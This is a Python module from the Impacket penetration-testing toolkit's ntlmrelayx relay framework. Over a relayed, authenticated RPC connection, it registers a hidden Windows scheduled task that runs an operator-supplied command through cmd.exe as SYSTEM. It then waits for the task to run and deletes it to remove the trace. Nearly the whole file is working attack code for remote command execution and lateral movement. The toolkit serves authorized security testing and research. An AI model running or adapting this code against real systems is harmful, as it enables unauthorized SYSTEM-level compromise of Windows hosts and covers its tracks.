# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2020 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Authors:
#   Arseniy Sharoglazov <mohemiv@gmail.com> / Positive Technologies (https://www.ptsecurity.com/)
#   Based on @agsolino and @_dirkjan code
#

import time
import string
import random

from impacket import LOG
from impacket.dcerpc.v5 import tsch
from impacket.dcerpc.v5.dtypes import NULL
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack

PROTOCOL_ATTACK_CLASS = "RPCAttack"

class TSCHRPCAttack:
    def _xml_escape(self, data):
        replace_table = {
             "&": "&amp;",
             '"': "&quot;",
             "'": "&apos;",
             ">": "&gt;",
             "<": "&lt;",
             }
        return ''.join(replace_table.get(c, c) for c in data)

    def _run(self):
        # Here PUT YOUR CODE!
        tmpName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])

        cmd = "cmd.exe"
        args = "/C %s" % self.config.command

        LOG.info('Executing command %s in no output mode via %s' % (self.config.command, self.stringbinding))

        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%s</Command>
      <Arguments>%s</Arguments>
    </Exec>
  </Actions>
</Task>
        """ % (self._xml_escape(cmd), self._xml_escape(args))

        LOG.info('Creating task \\%s' % tmpName)
        tsch.hSchRpcRegisterTask(self.dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)

        LOG.info('Running task \\%s' % tmpName)
        done = False

        tsch.hSchRpcRun(self.dce, '\\%s' % tmpName)

        while not done:
            LOG.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
            resp = tsch.hSchRpcGetLastRunInfo(self.dce, '\\%s' % tmpName)
            if resp['pLastRuntime']['wYear'] != 0:
                done = True
            else:
                time.sleep(2)

        LOG.info('Deleting task \\%s' % tmpName)
        tsch.hSchRpcDelete(self.dce, '\\%s' % tmpName)
        LOG.info('Completed!')


class RPCAttack(ProtocolAttack, TSCHRPCAttack):
    PLUGIN_NAMES = ["RPC"]

    def __init__(self, config, dce, username):
        ProtocolAttack.__init__(self, config, dce, username)
        self.dce = dce
        self.rpctransport = dce.get_rpc_transport()
        self.stringbinding = self.rpctransport.get_stringbinding()

    def run(self):
        # Here PUT YOUR CODE!

        # Assume the endpoint is TSCH
        # TODO: support relaying RPC to different endpoints
        # TODO: support for providing a shell
        # TODO: support for getting an output
        if self.config.command is not None:
            TSCHRPCAttack._run(self)
        else:
            LOG.error("No command provided to attack")
